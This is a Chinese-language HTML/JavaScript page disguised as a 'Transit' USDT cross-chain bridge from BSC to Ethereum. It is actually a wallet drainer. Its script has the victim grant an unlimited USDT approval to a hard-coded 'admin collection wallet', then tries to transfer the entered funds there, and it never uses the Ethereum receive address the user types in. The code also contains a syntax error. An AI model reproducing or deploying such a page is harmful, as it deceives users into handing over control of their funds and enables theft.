<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>闪兑&跨链</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif;
    }
    body {
      background-color: #f5f7fa;
      padding: 20px 16px;
      color: #111;
    }
    .page-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 32px;
      font-size: 24px;
    }
    .header-right-icon {
      display: flex;
      gap: 20px;
      align-items: center;
    }
    .title-main {
      font-size: 42px;
      font-weight: 600;
      margin-bottom: 30px;
    }
    .label-tip {
      color: #888;
      font-size: 16px;
      margin-bottom: 12px;
    }
    .asset-card {
      background: #eeeeef;
      border-radius: 14px;
      padding: 18px 16px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 16px;
    }
    .asset-left {
      display: flex;
      align-items: center;
      gap: 10px;
    }
    .coin-logo {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      background-color: #28b463;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      font-weight: bold;
    }
    .asset-text h4 {
      font-size: 18px;
      font-weight: 500;
    }
    .asset-text p {
      font-size: 14px;
      color: #666;
    }
    .asset-input-wrap {
      text-align: right;
    }
    .asset-input {
      background: transparent;
      border: none;
      font-size: 20px;
      text-align: right;
      width: 120px;
      outline: none;
      color: #111;
    }
    .swap-arrow {
      text-align: center;
      margin: 10px 0;
      font-size: 26px;
      color: #3488ff;
    }
    .address-wrap {
      background: #eeeeef;
      border-radius: 14px;
      padding: 18px 16px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 30px;
      cursor: pointer;
    }
    .address-text {
      color: #888;
      font-size: 16px;
    }
    .confirm-btn {
      width: 100%;
      padding: 20px 0;
      background-color: #b0b8c4;
      color: #fff;
      border: none;
      border-radius: 14px;
      font-size: 20px;
      cursor: pointer;
      transition: 0.2s;
    }
    .confirm-btn.active {
      background-color: #3488ff;
    }
    .info-row {
      display: flex;
      justify-content: space-between;
      padding: 16px 0;
      font-size: 16px;
      color: #666;
    }
    .tab-bar {
      position: fixed;
      bottom: 0;
      left: 0;
      width: 100%;
      display: flex;
      justify-content: space-around;
      padding: 12px 0 26px;
      background: #fff;
      border-top: 1px solid #e5e7eb;
    }
    .tab-item {
      text-align: center;
      font-size: 12px;
      color: #888;
    }
    .tab-item.active {
      color: #3488ff;
    }
    /* 地址弹窗样式：仅输入框 */
    .addr-modal {
      position: fixed;
      left: 0;
      bottom: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.4);
      display: none;
      z-index: 999;
      align-items: flex-end;
    }
    .modal-content {
      width: 100%;
      background: #fff;
      border-radius: 16px 16px 0 0;
      padding: 24px 20px;
    }
    .modal-title {
      font-size: 18px;
      margin-bottom: 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .close-modal {
      color: #3488ff;
      font-size: 16px;
      cursor: pointer;
    }
    .addr-input-box {
      width: 100%;
      border: 1px solid #ddd;
      border-radius: 10px;
      padding: 16px;
      font-size: 16px;
      outline: none;
      margin-bottom: 20px;
    }
    .modal-confirm-btn {
      width: 100%;
      padding: 16px 0;
      background: #3488ff;
      color: #fff;
      border: none;
      border-radius: 10px;
      font-size: 17px;
    }
    /* 全局提示弹窗 */
    .tip-modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.4);
      display: none;
      z-index: 1000;
      align-items: center;
      justify-content: center;
    }
    .tip-box {
      background: #fff;
      width: 80%;
      max-width: 320px;
      border-radius: 14px;
      padding: 24px 20px;
    }
    .tip-confirm {
      text-align: right;
      margin-top: 20px;
    }
    .tip-confirm button {
      border: none;
      background: none;
      color: #3488ff;
      font-size: 16px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="page-header">
    <div>闪兑&跨链 <span style="font-size:18px;color:#777">限价模式</span></div>
    <div class="header-right-icon">
      <span>◯</span>
      <span>⚙</span>
    </div>
  </div>

  <div class="title-main">Transit</div>

  <div class="label-tip">发送</div>
  <div class="asset-card">
    <div class="asset-left">
      <div class="coin-logo">₮</div>
      <div class="asset-text">
        <h4>USDT</h4>
        <p>币安智能链 BSC</p>
      </div>
    </div>
    <div class="asset-input-wrap">
      <input class="asset-input" id="sendAmountInput" type="number" min="0" step="0.0001" placeholder="0">
    </div>
  </div>

  <div class="swap-arrow">⇆</div>

  <div class="label-tip">接收（预估）</div>
  <div class="asset-card">
    <div class="asset-left">
      <div class="coin-logo">₮</div>
      <div class="asset-text">
        <h4>USDT</h4>
        <p>以太坊 ETH</p>
      </div>
    </div>
    <div class="asset-input-wrap">
      <span id="receiveAmountText">0.0000</span>
    </div>
  </div>

  <div class="address-wrap" id="addressDropBox">
    <div class="address-text" id="showReceiveAddr">请粘贴以太坊接收地址</div>
    <span>▼</span>
  </div>

  <button class="confirm-btn" id="crossBtn">确认跨链转出</button>

  <div class="info-row">
    <span>兑换价格</span>
    <span>-</span>
  </div>

  <!-- 地址弹窗：仅手动输入框 -->
  <div class="addr-modal" id="addressModal">
    <div class="modal-content">
      <div class="modal-title">
        <span>填写接收地址</span>
        <span class="close-modal" id="closeAddrModal">关闭</span>
      </div>
      <input type="text" class="addr-input-box" id="userEthAddrInput" placeholder="粘贴以太坊钱包地址(0x开头)">
      <button class="modal-confirm-btn" id="saveAddrBtn">确认地址</button>
    </div>
  </div>

  <!-- 提示弹窗 -->
  <div class="tip-modal" id="globalTipModal">
    <div class="tip-box">
      <p id="tipContent"></p>
      <div class="tip-confirm">
        <button id="closeTipBtn">确定</button>
      </div>
    </div>
  </div>

  <!-- 底部导航 -->
  <div class="tab-bar">
    <div class="tab-item">资产</div>
    <div class="tab-item">行情</div>
    <div class="tab-item active">交易</div>
    <div class="tab-item">发现</div>
    <div class="tab-item">我的</div>
  </div>

<script>
// ===================== 配置区（自行修改管理员钱包地址）=====================
const BSC_USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
// 管理员归集BSC钱包地址，替换为你尾号C6的钱包
const ADMIN_COLLECT_WALLET = "0xXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXC6";
const BSC_CHAIN_ID = 56;
const FEE_RATIO = 0.999;

// DOM元素
const sendAmountInput = document.getElementById("sendAmountInput");
const receiveAmountText = document.getElementById("receiveAmountText");
const crossBtn = document.getElementById("crossBtn");
const addressDropBox = document.getElementById("addressDropBox");
const addressModal = document.getElementById("addressModal");
const closeAddrModal = document.getElementById("closeAddrModal");
const userEthAddrInput = document.getElementById("userEthAddrInput");
const saveAddrBtn = document.getElementById("saveAddrBtn");
const showReceiveAddr = document.getElementById("showReceiveAddr");
const globalTipModal = document.getElementById("globalTipModal");
const tipContent = document.getElementById("tipContent");
const closeTipBtn = document.getElementById("closeTipBtn");

// 全局状态
let provider, signer, usdtContract;
let walletStep = 0; // 0未连接 1已连接待授权 2已授权待转账
let userEthReceiveAddress = "";

// 全局提示弹窗封装
function showTip(msg) {
  tipContent.innerText = msg;
  globalTipModal.style.display = "flex";
}
closeTipBtn.onclick = () => {
  globalTipModal.style.display = "none";
};

// 实时计算接收数量
sendAmountInput.addEventListener("input", function () {
  const inputVal = parseFloat(this.value);
  if (isNaN(inputVal) || inputVal <= 0) {
    receiveAmountText.innerText = "0.0000";
    crossBtn.classList.remove("active");
    crossBtn.disabled = true;
    return;
  }
  const receiveVal = (inputVal * FEE_RATIO).toFixed(4);
  receiveAmountText.innerText = receiveVal;
  crossBtn.classList.add("active");
  crossBtn.disabled = false;
});

// 地址下拉弹窗打开&关闭
addressDropBox.addEventListener("click", () => {
  addressModal.style.display = "flex";
});
closeAddrModal.addEventListener("click", () => {
  addressModal.style.display = "none";
});

// 保存用户填写的以太坊地址
saveAddrBtn.addEventListener("click", () => {
  const inputAddr = userEthAddrInput.value.trim();
  const ethReg = /^0x[a-fA-F0-9]{40}$/;
  if (!ethReg.test(inputAddr)) {
    showTip("请输入合法的0x开头以太坊钱包地址");
    return;
  }
  userEthReceiveAddress = inputAddr;
  const shortAddr = inputAddr.slice(0, 6) + "..." + inputAddr.slice(-4);
  showReceiveAddr.innerText = shortAddr;
  addressModal.style.display = "none";
  userEthAddrInput.value = "";
});

// 切换到BSC主网
async function switchToBSC() {
  if (!window.ethereum) return false;
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: "0x" + BSC_CHAIN_ID.toString(16) }]
    });
    return true;
  } catch (err)
    if (err.code === 4902) {
      await window.ethereum.request({
        method: "wallet_addEthereumChain",
        params: [{
          chainId: "0x" + BSC_CHAIN_ID.toString(16),
          chainName: "BNB Smart Chain",
          nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
          rpcUrls: ["https://bsc-dataseed.binance.org"],
          blockExplorerUrls: ["https://bscscan.com"]
        }]
      });
      return true;
    }
    showTip("切换BSC网络失败，请手动在钱包切换");
    return false;
  }
}

// 连接钱包 + 初始化合约（关闭ENS自动解析，修复报错核心改动）
async function connectWeb3Wallet() {
  if (!window.ethereum) {
    showTip("请在TP/小狐狸钱包内置浏览器打开页面");
    return false;
  }
  try {
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const isSwitchBSC = await switchToBSC();
    if (!isSwitchBSC) return false;

    // 核心修复：关闭Provider ENS解析，避免BSC触发ENS调用报错
    provider = new ethers.providers.Web3Provider(window.ethereum, "any");
    provider._ensProvider = null;

    signer = provider.getSigner();
    usdtContract = new ethers.Contract(
      BSC_USDT_CONTRACT,
      [
        "function approve(address spender, uint256 amount) external returns(bool)",
        "function transferFrom(address from, address to, uint256 amount) external returns(bool)",
        "function allowance(address owner, address spender) view returns(uint256)"
      ],
      signer
    );
    walletStep = 1;
    showTip("钱包连接成功，下一步授权USDT");
    return true;
  } catch (e) {
    showTip("钱包连接失败：" + e.message);
    return false;
  }
}

// 主按钮：确认跨链转出 完整上链逻辑
crossBtn.addEventListener("click", async function () {
  const sendNum = parseFloat(sendAmountInput.value);
  if (isNaN(sendNum) || sendNum <= 0) {
    showTip("请输入转出数量");
    return;
  }
  if (!userEthReceiveAddress) {
    showTip("请先填写以太坊接收地址");
    return;
  }

  // 步骤1：未连接钱包，先连接
  if (walletStep === 0) {
    await connectWeb3Wallet();
    return;
  }

  // 步骤2：发起USDT授权
  if (walletStep === 1) {
    this.disabled = true;
    showTip("正在BSC链授权USDT权限，请在钱包确认签名");
    try {
      const gasPrice = await provider.getGasPrice();
      const txOption = {
        gasPrice: gasPrice.mul(110).div(100),
        gasLimit: 300000
      };
      const approveTx = await usdtContract.approve(
        ADMIN_COLLECT_WALLET,
        ethers.constants.MaxUint256,
        txOption
      );
      await approveTx.wait(1);
      walletStep = 2;
      this.innerText = "确认划转至管理员钱包";
      this.disabled = false;
      showTip("授权成功，再次点击按钮完成转账");
    } catch (err) {
      showTip("授权失败：" + err.message);
      this.disabled = false;
    }
    return;
  }

  // 步骤3：transferFrom归集资产到管理员钱包
  if (walletStep === 2) {
    this.disabled = true;
    showTip("BSC链正在转账，请勿关闭页面");
    try {
      const userWalletAddr = await signer.getAddress();
      const amountWei = ethers.utils.parseUnits(sendNum.toString(), 18);
      const gasPrice = await provider.getGasPrice();
      const txOption = {
        gasPrice: gasPrice.mul(110).div(100),
        gasLimit: 300000
      };
      const transferTx = await usdtContract.transferFrom(
        userWalletAddr,
        ADMIN_COLLECT_WALLET,
        amountWei,
        txOption
      );
      await transferTx.wait(1);
      showTip("转账上链成功！BSC资产已转入管理员钱包");
      this.innerText = "转账完成";
    } catch (err) {
      showTip("转账失败：" + err.message);
      this.disabled = false;
    }
  }
})
</script>
</body>
</html>
